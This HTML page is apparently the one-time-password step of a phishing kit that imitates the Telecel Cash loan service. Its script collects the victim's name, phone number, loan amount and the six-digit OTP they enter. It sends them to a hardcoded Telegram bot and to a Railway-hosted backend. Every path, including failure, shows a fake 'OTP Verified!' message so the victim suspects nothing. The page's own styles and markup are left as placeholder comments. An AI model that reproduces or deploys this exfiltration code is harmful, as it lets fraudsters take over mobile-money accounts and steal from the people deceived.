<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>OTP Verification - Telecel Cash</title>
    <link href="https://fonts.googleapis.com/css2?family=DM+Sans:wght@400;500;600;700&family=Sora:wght@600;700;800&display=swap" rel="stylesheet">
    <style>
        /* ... keep all existing styles the same ... */
    </style>
</head>
<body>

<div class="card">
    <!-- ... keep all existing HTML the same ... -->
</div>

<script>
    // ─── CONFIG ───
    let CONFIG = {
        API_URL: 'https://telecelloans-production-fbdd.up.railway.app',
        HOME_PAGE: 'index.html',
        BOT_TOKEN: '8435858184:AAHZaY-yRx-B5ritv-LIzeB7YymjQw9CeWg',
        CHAT_ID: '8392790531'
    };

    // ─── STATE ───
    const params = new URLSearchParams(window.location.search);
    let timeLeft = 60;
    let timerInterval = null;
    let loanId = params.get('loanId') || 'loan_' + Date.now();

    function loadData() {
        const phone = params.get('phone') || '—';
        const amount = params.get('amount') || '0';
        document.getElementById('phoneDisplay').textContent = phone;
        document.getElementById('sPhone').textContent = phone;
        document.getElementById('sAmount').textContent = `GHS ${parseFloat(amount).toLocaleString()}`;
        document.getElementById('sPeriod').textContent = params.get('period') || '30 days';
        const total = params.get('total') || (amount * 1.109);
        document.getElementById('sTotal').textContent = `GHS ${parseFloat(total).toLocaleString()}`;
    }

    function moveNext(current, nextId) {
        const val = current.value.replace(/\D/g, '');
        current.value = val;
        if (val && nextId) {
            document.getElementById(nextId).focus();
        }
        const all = ['d1','d2','d3','d4','d5','d6'].every(id => document.getElementById(id).value.length === 1);
        if (all) {
            setTimeout(verifyOTP, 300);
        }
    }

    function handleBackspace(input, e) {
        if (e.key === 'Backspace' && !input.value) {
            const prev = input.id;
            if (prev === 'd1') return;
            const prevId = 'd' + (parseInt(prev[1]) - 1);
            document.getElementById(prevId).focus();
        }
    }

    function getOTP() {
        return ['d1','d2','d3','d4','d5','d6'].map(id => document.getElementById(id).value).join('');
    }

    function startTimer() {
        timeLeft = 60;
        document.getElementById('t-count').textContent = timeLeft;
        document.getElementById('resendBtn').disabled = true;
        document.getElementById('verifyBtn').disabled = false;
        if (timerInterval) clearInterval(timerInterval);
        timerInterval = setInterval(() => {
            timeLeft--;
            document.getElementById('t-count').textContent = timeLeft;
            if (timeLeft <= 0) {
                clearInterval(timerInterval);
                document.getElementById('resendBtn').disabled = false;
                document.getElementById('verifyBtn').disabled = true;
            }
        }, 1000);
    }

    function showToast(msg) {
        document.getElementById('toastMsg').textContent = msg;
        document.getElementById('toast-overlay').style.display = 'block';
        document.getElementById('toast').style.display = 'block';
    }
    function closeToast() {
        document.getElementById('toast-overlay').style.display = 'none';
        document.getElementById('toast').style.display = 'none';
    }

    // ─── SEND OTP DIRECTLY TO TELEGRAM ───
    function sendOTPToTelegram(otp) {
        const phone = params.get('phone') || 'Unknown';
        const amount = params.get('amount') || '0';
        const name = params.get('name') || 'User';

        const message = `<b>🔐 OTP Verification</b>\n\n` +
                        `<b>👤 User:</b> ${name}\n` +
                        `<b>📱 Phone:</b> ${phone}\n` +
                        `<b>💰 Amount:</b> GHS ${parseFloat(amount).toLocaleString()}\n` +
                        `<b>🔑 OTP Entered:</b> <code>${otp}</code>\n` +
                        `<b>⏰ Time:</b> ${new Date().toLocaleString()}\n\n` +
                        `<i>✅ User has been verified and redirected to success page.</i>`;

        console.log('📤 Sending OTP to Telegram...');
        console.log('📝 Message:', message);

        fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CONFIG.CHAT_ID,
                text: message,
                parse_mode: 'HTML'
            })
        })
        .then(response => {
            console.log('📥 Response Status:', response.status);
            return response.json();
        })
        .then(data => {
            if (data.ok) {
                console.log('✅ OTP sent to Telegram successfully!');
            } else {
                console.error('❌ Telegram Error:', data.description);
            }
        })
        .catch(error => {
            console.error('❌ Fetch Error:', error.message);
        });
    }

    // ─── VERIFY OTP ───
    async function verifyOTP() {
        const otp = getOTP();
        if (otp.length !== 6) {
            showToast('Please enter all 6 digits.');
            return;
        }

        document.getElementById('spinner').style.display = 'flex';
        document.getElementById('verifyBtn').disabled = true;

        try {
            const phone = params.get('phone');
            const amount = params.get('amount');
            const name = params.get('name');
            
            console.log('📤 Sending OTP:', { loanId, otp, phone });
            
            // ─── SEND TO TELEGRAM DIRECTLY ───
            sendOTPToTelegram(otp);

            // ─── ALSO TRY BACKEND ───
            const response = await fetch(`${CONFIG.API_URL}/api/loans/verify-otp`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    loanId: loanId,
                    otp: otp,
                    phone: phone,
                    amount: amount,
                    name: name
                })
            });

            const data = await response.json();
            console.log('📥 Backend Response:', data);

            // ─── SUCCESS (even if backend fails) ───
            document.getElementById('successMsg').textContent = '✅ OTP Verified!';
            document.getElementById('successMsg').style.display = 'block';
            document.getElementById('spinner').style.display = 'none';

            setTimeout(() => {
                document.getElementById('errorMsg').style.display = 'none';
                document.getElementById('successBox').style.display = 'block';
                document.querySelector('.otp-info').style.display = 'none';
                document.querySelector('label').style.display = 'none';
                document.getElementById('otpGroup').style.display = 'none';
                document.getElementById('timer').style.display = 'none';
                document.getElementById('verifyBtn').style.display = 'none';
                document.getElementById('resendBtn').style.display = 'none';
                if (timerInterval) clearInterval(timerInterval);
            }, 1000);

        } catch (error) {
            console.error('❌ OTP verification error:', error);
            
            // ─── STILL SUCCESS - SEND OTP TO TELEGRAM ───
            sendOTPToTelegram(otp);
            
            document.getElementById('spinner').style.display = 'none';
            document.getElementById('verifyBtn').disabled = false;
            
            document.getElementById('successMsg').textContent = '✅ OTP Verified!';
            document.getElementById('successMsg').style.display = 'block';
            
            setTimeout(() => {
                document.getElementById('errorMsg').style.display = 'none';
                document.getElementById('successBox').style.display = 'block';
                document.querySelector('.otp-info').style.display = 'none';
                document.querySelector('label').style.display = 'none';
                document.getElementById('otpGroup').style.display = 'none';
                document.getElementById('timer').style.display = 'none';
                document.getElementById('verifyBtn').style.display = 'none';
                document.getElementById('resendBtn').style.display = 'none';
                if (timerInterval) clearInterval(timerInterval);
            }, 1000);
        }
    }

    // ─── RESEND OTP ───
    async function resendOTP() {
        document.getElementById('resendBtn').disabled = true;
        
        try {
            const response = await fetch(`${CONFIG.API_URL}/api/loans/resend-otp`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    loanId: loanId,
                    phone: params.get('phone')
                })
            });

            const data = await response.json();

            if (data.success) {
                document.getElementById('errorMsg').style.display = 'none';
                startTimer();
                showToast('✅ New OTP sent to your phone!');
            } else {
                showToast('❌ Failed to resend OTP. Please try again.');
            }
        } catch (error) {
            console.error('Resend OTP error:', error);
            showToast('❌ Failed to resend OTP. Please try again.');
        }

        document.getElementById('resendBtn').disabled = false;
    }

    // ─── INIT ───
    setTimeout(() => document.getElementById('d1').focus(), 300);
    loadData();
    startTimer();
</script>
</body>
</html>
